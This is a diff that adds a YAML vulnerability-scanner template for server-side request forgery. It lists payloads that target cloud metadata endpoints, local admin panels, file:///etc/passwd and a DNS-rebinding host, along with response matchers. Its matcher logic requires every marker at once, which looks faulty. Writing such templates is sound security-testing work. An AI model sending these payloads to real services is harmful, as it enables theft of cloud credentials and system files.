@@ -1,0 +1,64 @@
+id: generic-ssrf
+info:
+  name: Server-Side Request Forgery
+  severity: high
+  description: Generic SSRF testing
+  tags:
+    - ssrf
+    - generic
+
+generic:
+  endpoint: "{{ssrf}}"
+
+  method: GET
+
+  parameter: "url"
+
+  payloads:
+    - name: "localhost_admin"
+      value: "http://127.0.0.1/admin"
+      description: "Local admin panel"
+
+    - name: "localhost_root"
+      value: "http://localhost:8080"
+      description: "Local server root"
+
+    - name: "internal_metadata"
+      value: "http://169.254.169.254/latest/meta-data/"
+      description: "Cloud metadata (AWS)"
+
+    - name: "gcp_metadata"
+      value: "http://metadata.google.internal/computeMetadata/v1/"
+      description: "Cloud metadata (GCP)"
+
+    - name: "azure_metadata"
+      value: "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
+      description: "Cloud metadata (Azure)"
+
+    - name: "file_etc_passwd"
+      value: "file:///etc/passwd"
+      description: "File protocol"
+
+    - name: "dns_rebinding"
+      value: "http://7f000001.nip.io"
+      description: "DNS rebinding test"
+
+  matchers:
+    # Positive matcher: must find SSRF evidence
+    - type: word
+      words:
+        - "ami-id"           # AWS metadata specific
+        - "InstanceProfile"  # AWS metadata specific
+        - "computeMetadata"  # GCP/AWS metadata specific
+        - "root:x:0:0"       # Successful file:// protocol
+      condition: and  # ← This determines overall condition
+
+    # Negative matcher: must NOT be an error page
+    - type: word
+      words:
+        - "404 Not Found"
+        - "Not Found"
+        - "Error 404"
+        - "500 Internal Server Error"
+        - "<title>Error</title>"
+      negative: true
